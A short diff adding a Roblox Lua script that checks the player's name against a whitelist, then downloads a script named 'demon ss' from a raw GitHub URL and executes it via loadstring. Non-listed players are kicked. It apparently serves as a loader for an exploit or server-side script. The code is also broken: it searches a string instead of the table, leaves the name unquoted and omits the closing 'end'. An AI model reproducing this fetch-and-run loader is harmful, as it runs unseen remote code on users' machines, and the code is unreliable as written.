@@ -1,0 +1,6 @@
+Whitelisted = {Krvxian_944651}
+
+if table.find("Whitelisted", game:GetService("Players").LocalPlayer.Name) then
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/DemonUnderYourBed/ss/main/demon%20ss"))()
+else
+ game:GetService("Players").LocalPlayer:Kick("SUS! System Dont Found You On Whitelist")
